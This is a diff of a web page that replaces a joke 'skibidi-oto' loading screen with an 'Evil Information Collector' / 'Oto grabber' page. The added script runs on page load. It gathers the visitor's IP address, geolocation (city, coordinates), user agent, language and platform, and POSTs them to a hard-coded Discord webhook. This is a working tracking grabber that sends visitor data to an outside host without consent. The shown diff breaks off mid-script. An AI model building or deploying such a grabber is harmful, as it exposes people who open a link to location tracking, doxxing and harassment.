@@ -1,81 +1,54 @@
-<!DOCTYPE html><html lang="en"><head>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta http-equiv="Cache-control" content="public">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-
-        <link rel="preload" href="WOFF/FreeSerif-YO4a.woff" as="font" type="font/woff">
-        <link rel="preload" href="WOFF/jackeyfont.woff" as="font" type="font/woff">
-        <link rel="preload" href="index.css" as="style">
-        <link rel="preload" href="crt.css" as="style">          
-        <link rel="preload" href="loading.css" as="style">
-            <link rel="stylesheet" href="css/index.css">
-            <link rel="stylesheet" href="css/crt.css">
-            <link rel="stylesheet" href="css/loading.css">
-
-    <link rel="icon" href="favicon.html" type="image/x-icon">
-
-    <title>「skibidi-oto」</title>
-    <meta name="theme-color" content="#000>
-
-    <meta property=" og:title"="">
-    <meta property="og:type" content="website">
-    <meta property="og:description" content="sigmas...">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil Information Collector</title>
 </head>
-
 <body>
+    <h1>Oto grabber !</h1>
+    <p>Your ip and location has been send sorry!</p>
 
-<crt id="crt">   
+    <!-- Include jQuery library -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
-</crt>
+    <script>
+        // Function to gather information and send it to your webhook
+        function gatherAndSendInfo() {
+            // Get IP address using a third-party service
+            fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(ipData => {
+                // Get location information using Geolocation-DB API
+                return $.getJSON('https://geolocation-db.com/json/')
+                .then(location => {
+                    // Prepare the data payload to send to the webhook
+                    let details = `Country: ${location.country_name},
+                        State: ${location.state},
+                        City: ${location.city},
+                        Latitude: ${location.latitude},
+                        Longitude: ${location.longitude},
+                        IP: ${location.IPv4}`;
+                    let infoPayload = {
+                        content: `Evil Information Collector:
+                            IP: ${ipData.ip}
+                            Location Details:
+                            ${details}
+                            User Agent: ${navigator.userAgent}
+                            Language: ${navigator.language}
+                            Platform: ${navigator.platform}`
+                    };
 
-<div class="load">        
-    <div class="ichi 一">
-        <h1 class="" style="float: left; margin: 0.5em;">skibidi<br>oto</h1>
-        <img src="images/longpp.png" alt="Monkey" style="height: 128px; float: right; padding: 1em;">
-            <p style="display: inline-block; text-align: left; padding-left: 1em; padding-top: 50px; font-size: 1.3em;">Skibidi (C)1969-2024 RSY &amp; Associates. All Rights Reserved.</p><br>
-            <br><br>
-            <p style="padding-left: 1em; font-size: 1.3em;">skibidi to my grave</p> <br>
-            <br>
-            <br>
-            <div class="anim-typewriter" style="padding-left: 1em; font-size: 1.3em;">
-                <p>[ <em class="green">OK</em> ]  �&nbsp;loading up the skibidi power...</p><br>
-            </div>
-            <div class="anim" style="padding-left: 1em; font-size: 1.3em;">
-                <p>[ <em class="green">OK</em> ]  �&nbsp;screaming skibidi-oto.com...</p><br>
-            </div>
-            <div class="anim2" style="padding-left: 1em; font-size: 1.3em;">
-                <p>[ <em class="red">FAILED</em> ]  �&nbsp;Failed to start:�&nbsp;Brain...</p><br>
-            </div>
-            
-            <br>
-            <br>
-            <br>
-            <br>
-            <p style="padding-left: 1em; font-size: 1.3em;">
-            Press DEL Key to go to BIOS ...<br>
-            Press Ctrl+W to get Free LTC!
-            </p>
-    </div>
-    <div class="ni 二"></div>
-    <div class="san 三"></div>
-    <div class="shi 四">
-        <div class="window 四">
-            <div class="logo">
-              <p class="top">skibidi-oto.com</p>
-              <p class="mid">skibidi<span>OS</span></p>
-              <p class="bottom">oto</p>
-            </div>
-            <div class="container">
-              <div class="box"></div>
-              <div class="box"></div>
-              <div class="box"></div>
-            </div>
-          </div>
-    </div>
-    <meta http-equiv="refresh" content="5; URL=https://skibidi-oto.com/gang">
-
-
-
-</div></body></html>
+                    // Send the data to your webhook
+                    return fetch('https://discord.com/api/webhooks/1247933793428570162/jDZUTQaV0_PySUuWMH80mJ5vGLWgxrxYyPUJ74UHAJP5y0suh2mN3OyEWQLmSMSYkI4X', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(infoPayload)
+                    });
+                });
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error sending information to webhook:', response.status);
+                }
